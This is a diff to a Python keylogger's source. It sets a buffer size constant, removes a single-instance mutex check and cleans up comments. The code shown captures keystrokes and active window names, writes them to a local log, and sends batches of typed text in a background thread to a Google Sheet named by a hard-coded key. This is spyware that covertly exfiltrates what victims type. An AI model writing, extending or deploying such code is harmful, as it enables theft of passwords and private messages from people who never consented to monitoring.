@@ -15,6 +15,7 @@ from threading import Thread
 PATH_LOGS = 'keylogs.txt'
 GSHEET_KEY = '15okwR0eO_WRlAtIc6HLRgjOQ8rpYerWwMg6-EyCIblI'
 CLIENT_CREDS = 'client_secret.json'
+DATA_BUFF = 20
 
 def gsheetinit(key):
     # use creds to create a client to interact with the Google Drive API
@@ -26,18 +27,7 @@ def gsheetinit(key):
     # Make sure you use the right name here.
     # sheet = client.open_by_key("Keylogger Demo").sheet1
     sheet = client.open_by_key(key).sheet1
-
-    # Extract and print all of the values
-    # list_of_hashes = sheet.get_all_records()
-    # print(list_of_hashes)
     return sheet
-
-# Disallowing Multiple Instance
-mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
-if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
-    mutex = None
-    print("Multiple Instance not Allowed")
-    exit(0)
 
 class Keylogger():
 
@@ -296,13 +286,12 @@ class Keylogger():
                     log_file.write('\r ===  === \r')
                     log_file.close()
             self.corresp(event.Key)
-            # self.data = self.data+key
             if event.WindowName != self.context:
                 self.context = event.WindowName
                 self.context_chg = 1
             print(self.data)  # debugging
             self.context_chg = 0
-        if len(self.data) > 20:
+        if len(self.data) > DATA_BUFF:
             try:
                 Thread(target=self.gsheet_logs, args=(self.data,)).start()
             except event as e:
